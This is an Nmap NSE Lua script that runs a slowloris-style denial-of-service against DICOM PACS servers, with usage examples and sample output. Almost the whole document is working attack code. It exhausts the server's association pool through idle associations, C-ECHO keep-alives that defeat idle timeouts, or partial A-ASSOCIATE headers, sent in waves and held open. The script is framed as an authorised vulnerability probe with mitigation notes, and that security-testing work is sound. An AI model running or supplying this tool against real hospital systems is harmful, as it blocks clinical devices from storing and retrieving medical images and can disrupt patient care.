description = [[
DICOM association exhaustion (slowloris-style) denial-of-service probe.

Tests whether a DICOM SCP is vulnerable to association exhaustion, a
slowloris-like attack adapted to the DICOM Upper Layer protocol (PS3.8).
The DICOM specification requires servers to maintain state for every
established association until it is explicitly released (A-RELEASE) or
aborted (A-ABORT). Most PACS, VNA, and modality software imposes a hard
limit on concurrent associations (commonly 10-50). An attacker who opens
associations and holds them idle -- or drip-feeds data to prevent timeout
-- can exhaust the server's association pool and block legitimate SCUs
(modalities, workstations, gateways) from connecting.

This is a direct analog of the HTTP slowloris attack:
  - HTTP slowloris:  open connections, send partial headers slowly
  - DICOM slowloris: open A-ASSOCIATEs, hold idle / drip C-ECHO slowly

Attack modes implemented:

  1. "idle" (default) - Complete the A-ASSOCIATE handshake, then hold the
     association open without sending any DIMSE command. The SCP must keep
     the association alive because PS3.8 has no mandatory idle timeout.

  2. "echo" - Complete A-ASSOCIATE, then periodically send a C-ECHO to
     reset any server-side idle timer (keep-alive). This defeats SCPs
     that implement ARTIM or proprietary idle timeouts.

  3. "partial" - Open TCP connections and send a partial A-ASSOCIATE-RQ
     (the first N bytes of the header). The SCP's ARTIM timer may wait
     up to 30-60 seconds for the rest. Each partial consumes a socket +
     ARTIM slot on the server.

The script opens associations in waves, periodically probing whether the
server is still accepting NEW associations. When the probe fails, the
server's pool is exhausted and the DoS condition is confirmed.

WARNING: This is a denial-of-service script. It WILL disrupt the target
PACS if the attack succeeds. Legitimate clinical devices will be unable
to send or query studies. Only use against systems for which you have
explicit written authorisation in a controlled testing window.

Requires the dicom.lua library (place in nselib/ or same directory).
]]

---
-- @usage
-- nmap -p 4242 --script dicom-slowloris \
--   --script-args 'dicom-slowloris.called_ae=ORTHANC,dicom-slowloris.connections=50' <target>
--
-- @usage
-- # Echo keep-alive mode with 100 connections
-- nmap -p 4242 --script dicom-slowloris \
--   --script-args 'dicom-slowloris.called_ae=ORTHANC,dicom-slowloris.mode=echo,dicom-slowloris.connections=100,dicom-slowloris.echo_interval=5' <target>
--
-- @usage
-- # Partial-header mode (pre-association)
-- nmap -p 4242 --script dicom-slowloris \
--   --script-args 'dicom-slowloris.called_ae=ORTHANC,dicom-slowloris.mode=partial,dicom-slowloris.connections=200' <target>
--
-- @args dicom-slowloris.called_ae       Target AE Title (default: "ANY-SCP")
-- @args dicom-slowloris.calling_ae      Our AE Title base (default:
-- "NMAP-SLOW")
-- @args dicom-slowloris.connections     Max connections to open (default: 50)
-- @args dicom-slowloris.mode            Attack mode: "idle", "echo", "partial"
-- (default: "idle")
-- @args dicom-slowloris.wave_size       Connections per wave (default: 10)
-- @args dicom-slowloris.wave_delay      Seconds between waves (default: 1)
-- @args dicom-slowloris.echo_interval   Seconds between C-ECHO keep-alives in
-- echo mode (default: 5)
-- @args dicom-slowloris.hold_time       Seconds to hold after exhaustion is
-- detected (default: 10)
-- @args dicom-slowloris.timeout         Connection/DIMSE timeout in seconds
-- (default: 10)
-- @args dicom-slowloris.max_pdu         Max PDU Length (default: 16384)
-- @args dicom-slowloris.partial_bytes   Bytes to send in partial mode
-- (default: 32)
-- @args dicom-slowloris.probe_interval  Seconds between availability probes
-- (default: 2)
-- @args dicom-slowloris.vary_ae         Vary calling AE per connection to
-- avoid dedup (default: false; enable only if server has no AE whitelist)
--
-- @output
-- PORT     STATE SERVICE
-- 4242/tcp open  dicom
-- | dicom-slowloris:
-- |   Mode: idle
-- |   Target AE: ORTHANC  Calling AE: NMAP-SLOW
-- |   Phase 1 - Filling association pool:
-- |     Wave 1: opened 10 associations (10 total, 0 failed)
-- |     Wave 2: opened 10 associations (20 total, 0 failed)
-- |     Wave 3: opened 8 associations, 2 refused (28 total, 2 failed)
-- |     Probe: server UNAVAILABLE after 28 associations
-- |   Phase 2 - Holding (10s):
-- |     Held 28 idle associations for 10.0s
-- |     Probe at +5s: still unavailable
-- |     Probe at +10s: still unavailable
-- |   Phase 3 - Release and recovery:
-- |     Released all 28 associations
-- |     Recovery probe: server available after 1.2s
-- |   Results:
-- |     Exhaustion threshold: 28 associations
-- |     Server blocked for: 10.0s (held) + 1.2s (recovery)
-- |     VULNERABLE: Association pool exhaustion confirmed
-- |     Risk: Any attacker with TCP access can block all DICOM
-- |       services (store, query, retrieve) with ~28 connections
-- |_
---

author   = "Paulino Calderon <paulino@calderonpale.com>"
license  = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}

local shortport = require "shortport"
local stdnse    = require "stdnse"
local nmap      = require "nmap"
local string    = require "string"
local math      = require "math"
local dicom     = require "dicom"

portrule = shortport.port_or_service({104, 2762, 11112, 4242}, "dicom", "tcp",
    "open")

-----------------------------------------------------------------------
-- HELPERS
-----------------------------------------------------------------------

local function get_arg(key, default)
  return stdnse.get_script_args("dicom-slowloris." .. key) or default
end

--- Sleep for N seconds using nmap's socket timeout trick.
-- Nmap NSE doesn't have a native sleep(), but we can use a receive
-- timeout on a dummy socket to block for a controlled duration.
local function sleep_s(seconds)
  local s = nmap.new_socket()
  s:set_timeout(math.floor(seconds * 1000))
  -- Try to receive on an unconnected socket - will timeout after `seconds`
  pcall(function() s:receive() end)
  s:close()
end

--- Try to open a full A-ASSOCIATE + C-ECHO probe to test if the server
-- is still accepting new associations.
-- @return true if server responded to C-ECHO, false otherwise
-- @return elapsed_ms
local function probe_available(host, port, called_ae, calling_ae, timeout_s)
  local t0 = nmap.clock_ms()
  local ok, sock, pctxs, server_max_pdu = dicom.do_associate(
    host, port, called_ae, calling_ae,
    {dicom.SOP_CLASS.VERIFICATION}, 16384, timeout_s)

  if not ok then
    return false, nmap.clock_ms() - t0
  end

  -- Try C-ECHO
  local pctx_id = dicom.pick_accepted_pctx(pctxs)
  if pctx_id then
    local echo_cmd = dicom.build_cecho_rq(99)
    dicom.send_dimse(sock, pctx_id, echo_cmd, nil, 16384)
    local pdu_type, cmd_elems = dicom.recv_dimse(sock, timeout_s)
    dicom.do_release(sock, 2)
    if pdu_type and cmd_elems and cmd_elems["0000,0900"] then
      return true, nmap.clock_ms() - t0
    end
  end

  dicom.do_release(sock, 2)
  return true, nmap.clock_ms() - t0
end

-----------------------------------------------------------------------
-- ATTACK MODE: IDLE
-- Open A-ASSOCIATE, hold without sending DIMSE
-----------------------------------------------------------------------

--- Open one idle association.
-- @return socket (or nil on failure), error string
local function open_idle_assoc(host, port, called_ae, calling_ae, max_pdu,
    timeout_s)
  local ok, sock, pctxs = dicom.do_associate(
    host, port, called_ae, calling_ae,
    {dicom.SOP_CLASS.VERIFICATION}, max_pdu, timeout_s)

  if not ok then
    return nil, tostring(sock)
  end
  -- Don't send any DIMSE command - just hold the association open
  return sock, nil
end

-----------------------------------------------------------------------
-- ATTACK MODE: ECHO (keep-alive)
-- Open A-ASSOCIATE, periodically send C-ECHO to defeat idle timers
-----------------------------------------------------------------------

--- Send a C-ECHO on an established association to keep it alive.
-- @return true if C-ECHO-RSP received, false otherwise
local function send_keepalive_echo(sock, pctx_id, msg_id, max_pdu, timeout_s)
  local echo_cmd = dicom.build_cecho_rq(msg_id)
  local ok, err = dicom.send_dimse(sock, pctx_id, echo_cmd, nil, max_pdu)
  if not ok then return false end

  local pdu_type, cmd_elems = dicom.recv_dimse(sock, timeout_s)
  if pdu_type and cmd_elems and cmd_elems["0000,0900"] then
    return true
  end
  return false
end

--- Open one echo-keepalive association. Returns socket + pctx_id.
local function open_echo_assoc(host, port, called_ae, calling_ae, max_pdu,
    timeout_s)
  local ok, sock, pctxs = dicom.do_associate(
    host, port, called_ae, calling_ae,
    {dicom.SOP_CLASS.VERIFICATION}, max_pdu, timeout_s)

  if not ok then
    return nil, nil, tostring(sock)
  end

  local pctx_id = dicom.pick_accepted_pctx(pctxs)
  if not pctx_id then
    dicom.do_release(sock, 2)
    return nil, nil, "No accepted presentation context"
  end

  return sock, pctx_id, nil
end

-----------------------------------------------------------------------
-- ATTACK MODE: PARTIAL
-- Open TCP, send incomplete A-ASSOCIATE-RQ header
-----------------------------------------------------------------------

--- Open a TCP connection and send a partial A-ASSOCIATE-RQ.
-- Only sends the first N bytes of the PDU header, forcing the server
-- to wait for the rest (ARTIM timer, typically 30-60s per PS3.8).
-- @return socket (or nil on failure), error string
local function open_partial_assoc(host, port, called_ae, calling_ae, max_pdu,
    timeout_s, partial_bytes)
  local sock = dicom.new_sock(timeout_s)
  local ok, err = dicom.tcp_connect(sock, host, port)
  if not ok then
    sock:close()
    return nil, "CONN_REFUSED"
  end

  -- Build a full A-ASSOCIATE-RQ, then only send the first N bytes
  local full_rq = dicom.build_assoc_rq(called_ae, calling_ae,
    {dicom.SOP_CLASS.VERIFICATION}, max_pdu)

  local to_send = math.min(partial_bytes, #full_rq)
  local partial = full_rq:sub(1, to_send)

  ok, err = dicom.tcp_send(sock, partial)
  if not ok then
    sock:close()
    return nil, "SEND_FAILED"
  end

  -- Don't send the rest - server's ARTIM timer will hold this open
  return sock, nil
end

-----------------------------------------------------------------------
-- MAIN ACTION
-----------------------------------------------------------------------

action = function(host, port)
  local called_ae       = get_arg("called_ae",       "ANY-SCP")
  local calling_ae      = get_arg("calling_ae",      "NMAP-SLOW")
  local max_conns       = tonumber(get_arg("connections",    "50"))
  local mode            = get_arg("mode",            "idle"):lower()
  local wave_size       = tonumber(get_arg("wave_size",      "10"))
  local wave_delay      = tonumber(get_arg("wave_delay",     "1"))
  local echo_interval   = tonumber(get_arg("echo_interval",  "5"))
  local hold_time       = tonumber(get_arg("hold_time",      "10"))
  local timeout_s       = tonumber(get_arg("timeout",        "10"))
  local max_pdu         = tonumber(get_arg("max_pdu",        "16384"))
  local partial_bytes   = tonumber(get_arg("partial_bytes",  "32"))
  local probe_interval  = tonumber(get_arg("probe_interval", "2"))
  local vary_ae         = (get_arg("vary_ae", "false")):lower() == "true"

  local out = stdnse.output_table()

  -- Validate mode
  if mode ~= "idle" and mode ~= "echo" and mode ~= "partial" then
    out["Error"] = "Invalid mode '" .. mode .. "'. Use: idle, echo, partial"
    return out
  end

  out["Mode"]       = mode
  out["Target AE"]  = called_ae
  out["Calling AE"] = calling_ae

  -- == Pre-flight: confirm server is responding ==
  local avail, pre_ms = probe_available(host, port, called_ae, calling_ae,
      timeout_s)
  if not avail then
    out["Error"] = string.format(
      "Server not responding to C-ECHO before test. " ..
      "The server may reject calling AE '%s' (AE whitelist). " ..
      "Try: dicom-slowloris.calling_ae=<known_AE>  " ..
      "Or the server may already be down.", calling_ae)
    return out
  end
  stdnse.debug1("Pre-flight probe: server available (%.0f ms)", pre_ms)

  -- == Phase 1: Fill the association pool ==
  local sockets = {}     -- held sockets
  local pctx_ids = {}    -- for echo mode: pctx_id per socket index
  local total_opened = 0
  local total_failed = 0
  local phase1_lines = {}
  local exhausted = false
  local exhaustion_threshold = 0
  local wave_num = 0

  while total_opened + total_failed < max_conns and not exhausted do
    wave_num = wave_num + 1
    local wave_opened = 0
    local wave_failed = 0

    for i = 1, wave_size do
      if total_opened + total_failed >= max_conns then break end

      -- Optionally vary calling AE per connection to avoid server-side
      -- dedup (some PACS reject duplicate AE pairs). Disabled by default
      -- because most PACS have AE whitelists that reject unknown AEs.
      local conn_ae = calling_ae
      if vary_ae and total_opened > 0 then
        local suffix = tostring(total_opened % 1000)
        local max_base = 16 - #suffix
        if max_base < 1 then max_base = 1 end
        conn_ae = calling_ae:sub(1, max_base) .. suffix
      end

      local sock, pctx_id, err
      if mode == "idle" then
        sock, err = open_idle_assoc(host, port, called_ae, conn_ae, max_pdu,
            timeout_s)
      elseif mode == "echo" then
        sock, pctx_id, err = open_echo_assoc(host, port, called_ae, conn_ae,
            max_pdu, timeout_s)
      elseif mode == "partial" then
        sock, err = open_partial_assoc(host, port, called_ae, conn_ae, max_pdu,
            timeout_s, partial_bytes)
      end

      if sock then
        sockets[#sockets + 1] = sock
        pctx_ids[#sockets] = pctx_id  -- nil for idle/partial modes
        wave_opened = wave_opened + 1
        total_opened = total_opened + 1
        stdnse.debug2("Opened connection %d (wave %d)", total_opened, wave_num)
      else
        wave_failed = wave_failed + 1
        total_failed = total_failed + 1
        stdnse.debug2("Connection failed: %s (wave %d)", tostring(err),
            wave_num)
      end
    end

    local wave_line
    if wave_failed > 0 then
      wave_line = string.format(
        "Wave %d: opened %d associations, %d refused (%d total, %d failed)",
        wave_num, wave_opened, wave_failed, total_opened, total_failed)
    else
      wave_line = string.format(
        "Wave %d: opened %d associations (%d total, %d failed)",
        wave_num, wave_opened, total_opened, total_failed)
    end
    phase1_lines[#phase1_lines + 1] = wave_line
    stdnse.debug1("%s", wave_line)

    -- Probe: is the server still accepting new associations?
    if total_opened > 0 then
      -- Use a fresh calling AE for the probe
      local probe_ok, probe_ms = probe_available(
        host, port, called_ae, calling_ae, timeout_s)

      if not probe_ok then
        exhausted = true
        exhaustion_threshold = total_opened
        phase1_lines[#phase1_lines + 1] = string.format(
          "Probe: server UNAVAILABLE after %d associations", total_opened)
        stdnse.debug1("*** EXHAUSTION DETECTED at %d associations ***",
            total_opened)
      else
        stdnse.debug2("Probe: server still available (%.0f ms)", probe_ms)
      end
    end

    -- Small delay between waves to avoid triggering rate-limit firewalls
    if not exhausted and wave_delay > 0 then
      sleep_s(wave_delay)
    end
  end

  -- If we hit max_conns without exhaustion, do a final probe
  if not exhausted then
    local probe_ok, probe_ms = probe_available(
      host, port, called_ae, calling_ae, timeout_s)
    if not probe_ok then
      exhausted = true
      exhaustion_threshold = total_opened
      phase1_lines[#phase1_lines + 1] = string.format(
        "Probe: server UNAVAILABLE after %d associations (at max_conns limit)",
            total_opened)
    else
      phase1_lines[#phase1_lines + 1] = string.format(
        "Reached max_conns (%d) - server still available (%.0f ms probe)",
        max_conns, probe_ms)
    end
  end

  out["Phase 1 - Filling association pool"] = phase1_lines

  -- == Phase 2: Hold and monitor ==
  local phase2_lines = {}
  local hold_start = nmap.clock_ms()
  local echo_count = 0
  local dead_conns = 0

  if exhausted and hold_time > 0 then
    phase2_lines[#phase2_lines + 1] = string.format(
      "Holding %d %s associations for %ds...",
      #sockets, mode, hold_time)

    local elapsed = 0
    local next_echo = echo_interval
    local next_probe = probe_interval

    while elapsed < hold_time do
      -- In echo mode, send keepalives
      if mode == "echo" and elapsed >= next_echo then
        local alive = 0
        for idx = 1, #sockets do
          if sockets[idx] and pctx_ids[idx] then
            echo_count = echo_count + 1
            local ok = send_keepalive_echo(
              sockets[idx], pctx_ids[idx], echo_count, max_pdu, timeout_s)
            if ok then
              alive = alive + 1
            else
              -- Connection died
              pcall(function() sockets[idx]:close() end)
              sockets[idx] = nil
              pctx_ids[idx] = nil
              dead_conns = dead_conns + 1
            end
          end
        end
        stdnse.debug2("Echo keepalive: %d alive, %d dead", alive, dead_conns)
        next_echo = elapsed + echo_interval
      end

      -- Periodic probe
      if elapsed >= next_probe then
        local probe_ok, probe_ms = probe_available(
          host, port, called_ae, calling_ae, timeout_s)
        if probe_ok then
          phase2_lines[#phase2_lines + 1] = string.format(
            "Probe at +%.0fs: server recovered (DoS lifted)", elapsed)
          stdnse.debug1("Server recovered during hold at +%.0fs", elapsed)
          break
        else
          phase2_lines[#phase2_lines + 1] = string.format(
            "Probe at +%.0fs: still unavailable", elapsed)
        end
        next_probe = elapsed + probe_interval
      end

      sleep_s(1)
      elapsed = (nmap.clock_ms() - hold_start) / 1000
    end

    local total_hold = (nmap.clock_ms() - hold_start) / 1000
    phase2_lines[#phase2_lines + 1] = string.format(
      "Held for %.1fs total", total_hold)

    if mode == "echo" then
      phase2_lines[#phase2_lines + 1] = string.format(
        "Sent %d C-ECHO keepalives, %d connections dropped",
        echo_count, dead_conns)
    end
  elseif not exhausted then
    phase2_lines[#phase2_lines + 1] = "Skipped (server not exhausted)"
  end

  out["Phase 2 - Holding"] = phase2_lines

  -- == Phase 3: Release and recovery ==
  local phase3_lines = {}
  local released = 0

  for idx = 1, #sockets do
    if sockets[idx] then
      if mode == "partial" then
        -- Partial connections: just close TCP
        pcall(function() sockets[idx]:close() end)
      else
        -- Full associations: send A-RELEASE for clean teardown
        pcall(function() dicom.do_release(sockets[idx], 2) end)
      end
      released = released + 1
    end
  end

  phase3_lines[#phase3_lines + 1] = string.format(
    "Released %d connections", released)

  -- Test recovery time
  local recovery_start = nmap.clock_ms()
  local recovery_ms = nil
  local max_recovery_wait = 30  -- seconds

  for attempt = 1, math.floor(max_recovery_wait / 2) do
    sleep_s(1)
    local probe_ok, probe_ms = probe_available(
      host, port, called_ae, calling_ae, timeout_s)
    if probe_ok then
      recovery_ms = nmap.clock_ms() - recovery_start
      phase3_lines[#phase3_lines + 1] = string.format(
        "Recovery probe: server available after %.1fs", recovery_ms / 1000)
      break
    end
    stdnse.debug2("Recovery attempt %d: still unavailable", attempt)
  end

  if not recovery_ms then
    phase3_lines[#phase3_lines + 1] = string.format(
      "Recovery probe: server still unavailable after %ds (may need restart)",
      max_recovery_wait)
  end

  out["Phase 3 - Release and recovery"] = phase3_lines

  -- == Results ==
  local results = {}

  if exhausted then
    results[#results + 1] = string.format(
      "Exhaustion threshold: %d associations", exhaustion_threshold)

    local hold_s = (nmap.clock_ms() - hold_start) / 1000
    if recovery_ms then
      results[#results + 1] = string.format(
        "Server blocked for: %.1fs (held) + %.1fs (recovery) = %.1fs total",
        hold_s, recovery_ms / 1000, hold_s + recovery_ms / 1000)
    else
      results[#results + 1] = string.format(
        "Server blocked for: %.1fs+ (did not recover within %ds)",
        hold_s, max_recovery_wait)
    end

    results[#results + 1] = "VULNERABLE: Association pool exhaustion confirmed"
    results[#results + 1] = string.format(
      "Risk: Any attacker with TCP access can block all DICOM " ..
      "services (store, query, retrieve) with ~%d connections",
      exhaustion_threshold)

    if mode == "idle" then
      results[#results + 1] = "Mitigation: Configure ARTIM/idle timeout, " ..
        "per-source association limits, and connection rate limiting"
    elseif mode == "echo" then
      results[#results + 1] = "Note: C-ECHO keepalives defeated idle" ..
                              " timeout - " ..
        "server needs per-source limits, not just idle timeout"
    elseif mode == "partial" then
      results[#results + 1] = "Note: Partial PDU attack - server waits for " ..
        "incomplete A-ASSOCIATE-RQ (ARTIM timer). Reduce ARTIM timeout " ..
        "and add TCP-level rate limiting."
    end
  else
    results[#results + 1] = string.format(
      "NOT VULNERABLE: Server accepted %d concurrent associations " ..
      "without exhaustion (pool may be larger, or unlimited)",
      total_opened)
    results[#results + 1] = string.format(
      "Try increasing dicom-slowloris.connections (current: %d)", max_conns)
  end

  out["Results"] = results

  nmap.set_port_state(host, port, "open")
  port.version.name = "dicom"
  port.version.product = "DICOM SCP"
  nmap.set_port_version(host, port, "hardmatched")

  return out
end
